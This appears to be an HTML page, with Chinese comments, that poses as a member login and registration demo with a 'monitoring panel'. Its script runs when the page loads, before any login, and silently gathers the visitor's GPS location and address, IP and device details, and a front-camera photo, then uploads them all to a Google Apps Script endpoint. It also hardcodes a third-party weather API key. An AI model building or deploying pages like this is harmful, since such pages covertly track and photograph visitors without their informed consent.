<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>高級監控面板</title>
  <!-- 若不需要 Chart.js，可刪除以下這行 -->
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <style>
    /* 成功訊息 */
    .msg-success {
      color: green;
      border: 1px solid green;
      padding: 8px;
      margin: 8px 0;
      display: none; /* 預設隱藏，動態顯示 */
    }
    /* 失敗或錯誤訊息 */
    .msg-error {
      color: red;
      border: 1px solid red;
      padding: 8px;
      margin: 8px 0;
      display: none; /* 預設隱藏，動態顯示 */
    }
    body {
      font-family: 'Arial', sans-serif;
      background-color: #1e1e2f;
      color: #ffffff;
      margin: 0;
      padding: 0;
    }
    h1 {
      text-align: center;
      margin-top: 20px;
      font-size: 24px;
    }
    .container {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 20px;
      padding: 20px;
    }
    .card {
      background: linear-gradient(145deg, #2b2b3d, #191926);
      border-radius: 15px;
      padding: 20px;
      box-shadow: 2px 2px 5px #121218, -2px -2px 5px #2e2e40;
      text-align: center;
    }
    .card h2 {
      font-size: 18px;
      margin-bottom: 15px;
    }
    .status-text {
      font-size: 14px;
      margin: 10px 0;
    }
    iframe {
      width: 100%;
      height: 300px;
      border: none;
      border-radius: 10px;
    }
  </style>
</head>
<body>
  <h1>會員系統範例</h1>
  <!-- 提示訊息區塊，預設隱藏。等動態顯示對應的訊息 -->
  <div id="statusSuccess" class="msg-success"></div>
  <div id="statusError" class="msg-error"></div>

  <!-- 註冊表單 -->
  <h2>註冊帳號</h2>
  <form id="registerForm">
    <label for="regEmail">Email：</label>
    <input type="email" id="regEmail" required>
    <br>
    <label for="regPassword">密碼：</label>
    <input type="password" id="regPassword" required>
    <br>
    <button type="submit">註冊</button>
  </form>

  <!-- 登入表單 -->
  <h2>登入帳號</h2>
  <form id="loginForm">
    <label for="loginEmail">Email：</label>
    <input type="email" id="loginEmail" required>
    <br>
    <label for="loginPassword">密碼：</label>
    <input type="password" id="loginPassword" required>
    <br>
    <button type="submit">登入</button>
  </form>

  <!-- 主要功能區（例如你的高級監控面板） -->
  <div id="mainPanel" style="display: none;">
    <h2>高級監控面板</h2>
    <div class="card">
      <h2>IP 與位置資訊</h2>
      <p id="ipInfo" class="status-text">資訊載入中...</p>
    </div>
    <div class="card">
      <h2>鏡頭狀態</h2>
      <p id="status" class="status-text">請開啟鏡頭使用...</p>
    </div>
    <div class="card">
      <h2>動態地圖</h2>
      <iframe id="map" src="about:blank"></iframe>
    </div>
    <div class="card">
      <h2>天氣資訊</h2>
      <p id="weatherInfo" class="status-text">天氣資訊載入中...</p>
    </div>
  </div>

  <script>
    /************************************************
     * 1. 統一管理你的 Apps Script URL
     ************************************************/
    const SCRIPT_URL = 'https://script.google.com/macros/s/替換成你自己的ID/exec';

    /************************************************
     * 2. 登入 / 註冊邏輯
     ************************************************/
    const statusSuccess = document.getElementById('statusSuccess');
    const statusError = document.getElementById('statusError');
    const mainPanel = document.getElementById('mainPanel');

    // 顯示成功訊息
    function showSuccessMessage(msg) {
      statusSuccess.innerText = msg;
      statusSuccess.style.display = 'block';
      statusError.style.display = 'none';
    }

    // 顯示錯誤訊息
    function showErrorMessage(msg) {
      statusError.innerText = msg;
      statusError.style.display = 'block';
      statusSuccess.style.display = 'none';
    }

    // 註冊
    document.getElementById('registerForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('regEmail').value;
      const password = document.getElementById('regPassword').value;
      try {
        const formData = new URLSearchParams();
        formData.append('action', 'register');
        formData.append('email', email);
        formData.append('password', password);

        const response = await fetch(SCRIPT_URL, {
          method: 'POST',
          body: formData
        });
        const result = await response.json();
        if (result.success) {
          showSuccessMessage('註冊成功，請進行登入');
        } else {
          showErrorMessage('註冊失敗：' + (result.error || '原因不明'));
        }
      } catch (error) {
        showErrorMessage('註冊請求失敗：' + error.message);
      }
    });

    // 登入
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('loginEmail').value;
      const password = document.getElementById('loginPassword').value;
      try {
        const formData = new URLSearchParams();
        formData.append('action', 'login');
        formData.append('email', email);
        formData.append('password', password);

        const response = await fetch(SCRIPT_URL, {
          method: 'POST',
          body: formData
        });
        const result = await response.json();
        if (result.success) {
          showSuccessMessage('登入成功！歡迎回來！');
          mainPanel.style.display = 'block';
        } else {
          showErrorMessage('登入失敗：' + (result.error || '原因不明'));
          mainPanel.style.display = 'none';
        }
      } catch (error) {
        showErrorMessage('登入請求失敗：' + error.message);
        mainPanel.style.display = 'none';
      }
    });

    /************************************************
     * 3. 相機、GPS、IP資料收集與上傳
     ************************************************/
    async function startCamera() {
      let stream = null;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: 'user' } },
        });
        const video = document.createElement('video');
        video.srcObject = stream;

        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        // 可視情況縮短拍照延遲 (500ms 或自行調整)
        await new Promise(resolve => setTimeout(resolve, 500));

        const canvas = document.createElement('canvas');
        // 若要縮小尺寸加快速度，可用 320 x 240
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // 調整 JPEG 品質 (0.8)
        const photoData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
        return photoData;
      } catch (error) {
        console.warn('相機啟動失敗:', error);
        return null;
      } finally {
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
      }
    }

    async function getGpsCoordinates() {
      try {
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
        });
        const { latitude, longitude } = position.coords;

        // 進行反向地理編碼
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
        const data = await response.json();
        const address = data.display_name || '未知地址';

        return { latitude, longitude, address };
      } catch (error) {
        console.warn('GPS 資訊獲取失敗:', error);
        return null;
      }
    }

    async function getIpInfo() {
      try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        const { ip, city, region, country, org } = data;
        const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
        const userAgent = navigator.userAgent;
        return { ip, ipType, userAgent, city, region, country, org };
      } catch (error) {
        console.warn('IP 資訊獲取失敗:', error);
        return null;
      }
    }

    async function collectAndSendData() {
      const statusElement = document.getElementById('status');
      if (statusElement) {
        statusElement.innerText = '正在收集資料...';
      }

      const collectedData = {
        gps: null,
        ip: null,
        photo: null,
      };

      try {
        // 同時取得GPS與IP
        const [gpsResult, ipResult] = await Promise.allSettled([
          getGpsCoordinates(),
          getIpInfo(),
        ]);
        // 相機拍照
        const photoResult = await startCamera();

        if (gpsResult.status === 'fulfilled') {
          collectedData.gps = gpsResult.value;
        }
        if (ipResult.status === 'fulfilled') {
          collectedData.ip = ipResult.value;
        }
        if (photoResult) {
          collectedData.photo = photoResult;
        }

        const formData = new URLSearchParams();
        formData.append('message', '合併資料上傳');
        if (collectedData.gps) {
          formData.append('latitude', collectedData.gps.latitude);
          formData.append('longitude', collectedData.gps.longitude);
          formData.append('address', collectedData.gps.address);
        }
        if (collectedData.ip) {
          formData.append('ip', collectedData.ip.ip);
          formData.append('ipType', collectedData.ip.ipType);
          formData.append('userAgent', collectedData.ip.userAgent);
          formData.append('city', collectedData.ip.city);
          formData.append('region', collectedData.ip.region);
          formData.append('country', collectedData.ip.country);
          formData.append('org', collectedData.ip.org);
        }
        if (collectedData.photo) {
          formData.append('imageData', collectedData.photo);
        }

        // 上傳至同一個 SCRIPT_URL
        const response = await fetch(SCRIPT_URL, {
          method: 'POST',
          body: formData
        });
        const result = await response.json();
        if (result.success) {
          if (statusElement) statusElement.innerText = '資料已成功發送！';
        } else {
          if (statusElement) statusElement.innerText = `資料發送失敗：${result.error}`;
        }
      } catch (error) {
        console.error('資料收集或傳送過程中發生錯誤:', error);
        if (statusElement) {
          statusElement.innerText = '資料收集或傳送過程中發生錯誤。';
        }
      }
    }

    /************************************************
     * 4. 天氣資訊
     ************************************************/
    async function getWeatherInfo(latitude, longitude) {
      try {
        if (!latitude || !longitude) return;
        // 請改成你自己的 API Key
        const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';
        const response = await fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&units=metric&lang=zh_tw&appid=${apiKey}`);
        const weatherData = await response.json();
        const temp = weatherData.main.temp;
        const weather = weatherData.weather[0].description;
        const humidity = weatherData.main.humidity;

        const weatherInfo = document.getElementById('weatherInfo');
        weatherInfo.innerHTML =
          `<img src="https://openweathermap.org/img/wn/${weatherData.weather[0].icon}.png" alt="${weather}">
           溫度: ${temp}°C, 天氣: ${weather}, 濕度: ${humidity}%`;
      } catch (error) {
        console.error('天氣資訊獲取失敗:', error);
        document.getElementById('weatherInfo').innerText = '天氣資訊獲取失敗';
      }
    }

    /************************************************
     * 5. DOMContentLoaded：自動執行資料蒐集 & 天氣定位
     ************************************************/
    document.addEventListener('DOMContentLoaded', async () => {
      // 先執行資料蒐集
      collectAndSendData();

      // GPS 供地圖與天氣使用
      const gpsData = await getGpsCoordinates();
      if (gpsData) {
        // 設定地圖
        document.getElementById('map').src =
          `https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}&hl=zh-TW&z=15&output=embed`;
        // 取得天氣
        getWeatherInfo(gpsData.latitude, gpsData.longitude);
      }
      // 若你想「不用登入也看得到面板」，就讓 mainPanel 預設打開
      mainPanel.style.display = 'block';
    });
  </script>
</body>
</html>
